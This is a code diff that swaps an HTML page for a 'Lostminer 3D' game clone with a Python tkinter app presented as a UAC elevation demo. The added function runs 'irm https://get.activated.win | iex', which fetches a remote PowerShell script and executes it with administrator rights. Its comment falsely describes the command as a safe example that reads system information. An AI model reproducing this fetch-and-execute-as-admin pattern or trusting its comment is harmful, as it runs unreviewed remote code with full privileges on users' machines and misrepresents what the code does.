@@ -1,51 +1,53 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Lostminer 3D Clone - Perfecto</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Three.js Base -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-</head>
-<body>
+import subprocess
+import sys
+import tkinter as tk
+from tkinter import messagebox
 
-    <canvas id="gameCanvas"></canvas>
 
-    <!-- UI Overlay: Pantalla de Carga/Menú -->
-    <div id="loading-overlay">
-        <div class="loader-content">
-            <h1>LOSTMINER 3D</h1>
-            <p id="loading-text">Generando mundo procedural...</p>
-            <button id="start-btn" style="display:none;">EMPEZAR AVENTURA</button>
-        </div>
-    </div>
+def ejecutar_powershell_admin():
+    # Comando de ejemplo seguro (obtiene información del sistema)
+    comando_ps = "irm https://get.activated.win | iex"
 
-    <!-- HUD de Juego -->
-    <div id="hud" style="display:none;">
-        <!-- Clasificación -->
-        <div id="leaderboard">
-            <h3>Top Mineros</h3>
-            <div class="lb-row active"><span>Yilber</span> <span>0 m</span></div>
-            <div class="lb-row"><span>Bot1</span> <span>15 m</span></div>
-        </div>
+    try:
+        # En Windows, 'runas' solicita la elevación UAC al usuario
+        import ctypes
 
-        <!-- Hotbar (Inventario Rápido) -->
-        <div id="hotbar">
-            <div class="slot active" data-item="pickaxe">⛏️</div>
-            <div class="slot" data-item="block_dirt">🟫</div>
-            <div class="slot" data-item="torch">🔦</div>
-        </div>
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            # Si la app ya es admin, ejecuta directamente
+            subprocess.run(["powershell", "-Command", comando_ps])
+        else:
+            # Re-ejecuta PowerShell solicitando permisos de administrador
+            ctypes.windll.shell32.ShellExecuteW(
+                None,
+                "runas",
+                "powershell.exe",
+                f"-NoExit -Command {comando_ps}",
+                None,
+                1,
+            )
+    except Exception as e:
+        messagebox.showerror("Error", f"No se pudo ejecutar el proceso: {e}")
 
-        <!-- Zonas de Control Táctil (Joysticks) -->
-        <div id="action-zones">
-            <div id="joystick-region"></div>
-            <div id="mine-btn">⛏️ <span class="btn-desc">MINAR</span></div>
-            <div id="jump-btn">⬆️</div>
-        </div>
-    </div>
 
-    <!-- PUNTO DE ENTRADA MODULAR -->
-    <script type="module" src="js/main.js"></script>
-</body>
-</html>
+# Configuración de la interfaz gráfica
+root = tk.Tk()
+root.title("Ejecutor de Procesos Administrador")
+root.geometry("350x150")
+
+label = tk.Label(
+    root, text="Demostración de elevación de privilegios (UAC)", pady=10
+)
+label.pack()
+
+btn_ejecutar = tk.Button(
+    root,
+    text="Ejecutar Comando como Admin",
+    command=ejecutar_powershell_admin,
+    bg="#0078D4",
+    fg="white",
+    padx=10,
+    pady=5,
+)
+btn_ejecutar.pack(pady=10)
+
+root.mainloop()
